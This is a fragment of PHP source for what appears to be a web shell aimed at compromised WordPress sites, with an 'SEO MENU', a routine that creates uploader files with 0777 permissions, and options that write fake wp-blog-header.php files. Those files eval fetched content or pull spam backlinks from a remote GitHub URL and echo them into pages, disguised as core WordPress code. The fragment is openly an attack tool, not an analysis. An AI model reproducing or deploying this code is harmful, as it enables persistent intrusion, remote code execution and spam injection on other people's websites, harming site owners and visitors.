...
// $GLOBALS['fungsi'][0]
	...
	<div class='py-3' id='main'>
		...
		<div class='container-fluid'>
			...
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=SEOwpblog'><i class='bi bi-cloud-fog2'></i> SEO MENU</a>
...
Allow from all
		...
		if ($_7['id'] == 'createuploader') {
			...
			if (isset($_7['bikin'])) {
				...
				if ($result !== false) {
					chmod($setNama, 0777);
					echo '<strong>Create file</strong> ok! <a href="' . $setNama . '">Click Here!</a> ' . ok() . '</div>';
				} else {
					echo '<strong>Create file</strong> fail! ' . er() . '</div>';
				}
			}
...
echo $result;
?>';
				} elseif ($selectedContent == 'content3') {
					$isiFile = '<?php
/**
* Loads the WordPress environment and template.
*
...
eval("?>" . $fileContents);
?>';
				} elseif ($selectedContent == 'content4') {
					$isiFile = '<?php
/**
* Loads the WordPress environment and template.
*
...
eval("?>" . $fileContents);
?>';
				} elseif ($selectedContent == 'content5') {
					$isiFile = '<?php
/**
* Loads the WordPress environment and template.
*
...
?>
<?php
$github_content = file_get_contents(\'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt\');
echo $github_content;
?>';
				} elseif ($selectedContent == 'content6') {
					$isiFile = '<?php
/**
* Loads the WordPress environment and template.
*
...
?>';
			...
			echo "<u>SEO Wp-Blog-Header</u>
				<form method='POST' id='defenseShellForm'>
					<input type='hidden' name='createhates' value='1'>
					<div class='d-grid gap-2'>
						<label><input type='radio' name='content' value='content1' checked> SEO Random Domain Curl</label>
						<label><input type='radio' name='content' value='content2'> SEO Vip Domain Curl</label>
						<label><input type='radio' name='content' value='content3' checked> SEO Random Domain Curl v2</label>
						<label><input type='radio' name='content' value='content4'> SEO Vip Domain Curl v2</label>
						<label><input type='radio' name='content' value='content5' checked> SEO Random Domain file_get_content</label>
						<label><input type='radio' name='content' value='content6'> SEO Vip Domain file_get_content</label>
						<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='create'>
					</div>
				</form>
			</div>";
